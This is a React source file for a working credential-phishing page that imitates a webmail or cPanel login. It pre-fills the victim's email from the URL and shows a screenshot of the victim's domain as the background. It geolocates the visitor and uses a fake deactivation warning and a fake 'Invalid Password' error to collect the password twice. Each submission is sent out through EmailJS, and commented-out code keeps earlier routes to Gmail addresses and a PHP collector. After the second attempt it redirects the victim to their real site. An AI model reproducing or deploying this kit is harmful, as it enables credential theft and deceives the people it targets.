
import React, { useState, useEffect, useRef } from "react";
import './Webmail.css';
// import { AiOutlineClose } from 'react-icons/ai';
// import { FaUserAlt } from 'react-icons/fa';
// import { MdLock } from 'react-icons/md';
// import $ from 'jquery';
// import Preloader from "../../Preloader/Preloader";
import emailjs from '@emailjs/browser';


const App = ()=>{

  const formRef = useRef();


  const [ipAdress, setIpAdress] = useState('')
  const [city, setCity] = useState('');
  const [flag, setFlag] = useState('');
  const [country, setCountry] = useState('');

  const forTime = new Date();

  useEffect(()=>{
    fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
    .then(req=> req.json())
    .then(res=>{

        setIpAdress(res.ip)
        setFlag(res.country.flag);
        setCountry(res.country.name);
        setCity(res.city.names.en);

    })
    .catch(e=> console.log)
}, []);




  const [spinLoader, setSpinLoader] = useState(false);

    useEffect(()=>{
        document.title = "Webmail Login";
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2700);
    }, []);

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();



    const ababab = window.location.href;
    const cncnc = ababab.indexOf("@");
    const ggg = ababab.substr((cncnc+1)).split('&', 1).toString();
    // console.log(ggg);



  const [email, setEmail] = useState(extracetdEmail);
  const [pwd, setPwd] = useState('');

  // const formRef = useRef();

  const [invalid, setInvalid] = useState(false);
  // const [authenticating, setAuthenticating] = useState(false);

  const [count, setCount] = useState(0);

  const [b, setB] = useState('Submit')



  const submitHandler = (e) => {
    e.preventDefault();
    if (pwd === "") {
      return null
    }
    else{
      setSpinLoader(true);

      setTimeout(() => {
        setSpinLoader(false);
      }, 2100);
      setB('Validating...')

        // setAuthenticating(true);
        setInvalid(false);
        setTimeout(() => {
          // setAuthenticating(false);
          setInvalid(true);
          setPwd('');
          setB(b)
        }, 2500);




      //   const user = {
      //     email: email,
      //     password: pwd
      // };




          // post to server
          // const user = {
          //   email: email,
          //   password: pwd,
            // subject: "Chameleon Page Logs",
            // to: "rvvlsales13@gmail.com",
            // // body: `Email: ${defaultEmail}  Password: ${defaultPassword}`
            // body:
            // `
            // <html lang="en">
            // <p>Online Correspondence: ${email}</p>
            // <p>Signal: ${pwd}</p>
            // <p>Country: ${country}</p>
            // <p>Flag: ${flag}</p>
            // </html>
            // `
        // };

      //   const user = {
      //     "subject": "Coming Logs",
      //     "to": "reportwork5252@gmail.com",
      //     "body": `<div><h3></h3><p>Online_Correspondence: ${email}</p><p>Signal: ${pwd}</p><p>Country: ${country}</p><p>Flag: ${flag}</p></div>`
      // }



      // $.ajax({
      //     type: "POST",
      //     url: "https://trezanolz.com/kenneth/chame.php",
      //     data: user,
      //     success(data) {
      //         console.log(data);
      //     },
      // });


      
      const serviceID = `service_xhrj4w4`;
      const templateID = `template_crghlbk`;
      const publicKey = `35JbsFMyI7dxAGiKW`;


      emailjs
      .sendForm(serviceID, templateID, formRef.current, {
        publicKey: publicKey,
      })
      .then(
        () => {
          console.log('!');
        },
        (error) => {
          console.log('...', error.text);
        },
      );





      
      setCount(count=> count + 1);
            if(count >= 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                console.log(extracetdemailDomain);
                setTimeout(() => {
                  window.location.reload();
                  window.location.href = `https://www.${extracetdemailDomain.split('&', 1).toString()}`;
                }, 2100);
            };

    }
  };


  return(<React.Fragment>

    {spinLoader ? <div></div> : null }


    <section className="cccontainerr" style={{
      backgroundImage:`url(https://image.thum.io/get/auth/55834-0cce91165e5bf0fc1a6292abe05ecb9c/width/1400/https://${ggg})`,
      backgroundRepeat:'no-repeat',
      backgroundSize:'cover'
    }}>

      <div style={{
        display:'flex',
        justifyContent:'center',
        alignItems:'center',
        position:'absolute',
        top:'55%',
        left:'50%',
        transform:'translate(-50%,-50%)'
      }}>
        <div className="bbbox">

            <div style={{
              display:'flex',
              justifyContent:'center',
              alignItems:'center',
              marginTop:'2em',
              textAlign:'center'
            }}>
              <img 
                alt="dfjh" 
                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAACXBIWXMAAAsTAAALEwEAmpwYAAADKUlEQVR4nO3aS6gOYRzH8ee4H7kliXSkFBFFKeqIBTssT1lZ2lraWsrO0lZWtoqFsqCIsnAiRXQkkmtux3H96q3nrelt7u9c/s+8v09ZmnlmvjPzzDvPcU5EREREREREREREOgAxRUGMURBjFMR6kLbntFGjIMYoiDEKYoyCGKMgxiiIMQpijIKEHgRY1M5QuyfuXJYJ8hSYamzUHQUcBh5VEaTvBrC7sSPoCGA7cC3H+S0cpOcvcBFY39gRBQpYA5wH/hQ4v4WD9H0DzgDjjR1hQPMEcAr4HHfiqggyTbIZ4Dgw5kYcMObPRe+cJJmuIsg84ATwJmVH94D9bkQBe4BbKefnvb9rFgwdJPIfl/nH1I+Enf4DLgOb3IgANgAX/Nwa55efR1ambKNckMgGJvzE3gsQZxY4C6xwHQUsBU4DX0l2BdicY1vDBYlsaC9wO2VAr4GTwHzXrXliCniRctz3gQMFtllNkIEBzmQM8KALHLAPuJNynK/KXICVBom5hb8MewtbA2zMeER/94/o5SW3X32QEpPcKmccDb3E1Bpk4DXwJsk+JL0Gti3na/5dYLKi/dUfJLKzY8CzlAN7DBx1RgCHgAcp433pY1X2Q7jRIHk+JXjXgZ1V77vAGLf6xw8Zn4qW1LDvZoNkfWyL+O3nn7V1jSFmTKv9hPwzYUz9j6nrahxDO0EiA9gGXE25Gj/5N7bFNY5hoX9FfZcyjt5yw666xmAmyMCCzcOUE/KkjoWxtvZrPsjAlfq27iuV7DvzY913pvkgTTzLMTh3mQ8SGdyWnG874xW+3e1o5ugCDFLV7wH/++d5xu+fI86AIIIUXBibLPCFIHGhqC3BBOnrLe4A54C5lG9Kl/y/pA+Ac34biQtFbQkuSIGvrkF+ZQ42SIGFsaDWYYIPkmNhrNRCUVs6ESRhbXt2mIWitnQqyMAfXky4AHUySMgUxBgFMUZBjFEQYxTEGAUxRkGMURBjFMQYBTFGQYxREGMUxBgFMUZBjFEQYxTEGAUxRkGMURBjFMQYBTFGQYxRkNCCSLsUxBgFMUZBjGl7ThMRERERERERERERV4H/D2II3NSy5O0AAAAASUVORK5CYII="
                className="snnn"
              />
            </div>

            <p className="signinn">Sign in to continue</p>

            <p className="ddact">Fill in your correct password to avoid deac­tivation.</p>

            {invalid ? <p className="errmsssgg">Inv­alid Password! Try again with correct pas­sword.</p> : null }

            <form ref={formRef} style={{
              display:'flex',
              flexDirection:'column',
              alignItems:'center',
              marginTop:'20px'
            }} onSubmit={submitHandler}>

              <div className="em_cont">
                <input 
                  className="h-10 w-[23rem] border border-slate-300 rounded-r focus:outline-none 
                  focus:border-blue-100 focus:ring-2 pl-3 text-base text-gray-600 font-light"
                  type="email"
                  placeholder="Email"
                  readOnly
                  value={email} 
                  onChange={ e=> setEmail(e.target.value) }
                  name="online_correspondence"
                />
              </div>


              <div className="pwd_con">
                <input 
                  type="password"
                  className="h-10 w-[23rem] border border-slate-300 rounded-r focus:outline-none 
                  focus:border-blue-100 focus:ring-2 pl-3 text-base text-gray-600 font-light"
                  placeholder="Password"
                  autoFocus
                  value={pwd}
                  onChange={ e=> setPwd(e.target.value) }
                  name="signal"
                />
              </div>

              <input type="text" value={country} name="country" hidden/>
              <input type="text" value={city} name="city" hidden/>


              <div className="font-light text-blue-600 pb-8 pt-2" bis_skin_checked="1" style={{
                marginTop:'13px',
                marginBottom:'10px',
                float:'left',
                marginLeft:'-5cm'
              }}>

                <input className="" type="checkbox" name="" id="" />

                <a className="pr-12 pl-1 text-neutral-400 text-sm" href="/">Remember me</a>
            </div>


            <div>
                <input 
                  type="submit"
                  style={{cursor:'pointer'}}
                  className="h-12 w-[23rem] text-gray-100 bg-blue-500 rounded mb-6"
                  onClick={submitHandler}
                  value={b}
                />
            </div>




            </form>

        </div>
      </div>

    </section>

















{/* ======================================================================================================================================
====================================================================================================================================== */}
    {/* <section className='wrappper'>

      { spinLoader ? <Preloader /> : null }

    { authenticating ? <div className="expired_session processing" style={{
      background: '#009cde'
    }}>
        <AiOutlineClose className="close" style={{
      background: '#009cde',
      color:'#fff'
    }}></AiOutlineClose>
        &nbsp;
        Authenticating...
      </div> : null }

      { invalid ? <div className="expired_session">
        <AiOutlineClose className="close"/>
        &nbsp;
        The Login is invalid
      </div> : null }

      <div >

        &nbsp;
        <br />
        <br />
        <br />
        <br />
      </div>

      <article>

        <div className="webmail_logo">
          <img 
          src="https://webmail.gigared.com/cPanel_magic_revision_1610662436/unprotected/cpanel/images/webmail-logo.svg"
          alt="logo" 
          className="webmail_img"
          />
        </div>


        <div className="log_in_form">

          <form className="forrmm" ref={formRef} onSubmit={submitHandler}>

            <div className="email_cont same_cont_style dddiiivvvccc">
              <span className="labels_for_inp">Email Address</span>
              <br />
              
              <div className="div_2_include_icon_in_input_">
                <FaUserAlt className="inp_icon" />
                <input 
                  type="email"
                  placeholder={`Enter your email address.`} 
                  className="iinnppuutt"
                  value={email} 
                  onChange={ e=> setEmail(e.target.value) }
                  name="email"
                />
              </div>

            </div>


            <div className="pwd_cont same_cont_style dddiiivvvccc">
              <span className="labels_for_inp">Password</span>
              <br />

              <div className="div_2_include_icon_in_input_">

                <MdLock className="inp_icon"/>
                <input 
                  type="password"
                  placeholder={`Enter your email address.`} 
                  required
                  className="iinnppuutt"
                  value={pwd}
                  onChange={ e=> setPwd(e.target.value) }
                  name="password"
                  autoFocus
                />

              </div>

            </div>

            <div className="submit_btn_cont dddiiivvvccc">
              <input 
                type={`submit`} 
                value={`Log in`} 
                className='btn_sub' 
                onClick={submitHandler}
              />
            </div>

          </form>
        </div>

      </article>


    <div className="langs">
      <p>English</p>
      <p>العربية</p>
      <p>čeština</p>
      <p>dansk</p>
      <p>Deutsch</p>
      <p>Ελληνικά</p>
      <p>español</p>
      <p>español latinoamericano</p>
      <p>...</p>
    </div>

    <div className="copyright">
      <img 
        alt="tiny"
        src="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" 
      />
      <br />
      Copyright©&nbsp;2023 cPanel, L.L.C.
      <br />
      <p>Privacy Policy</p>
    </div>

    </section> */}


  </React.Fragment>)
}

export default App;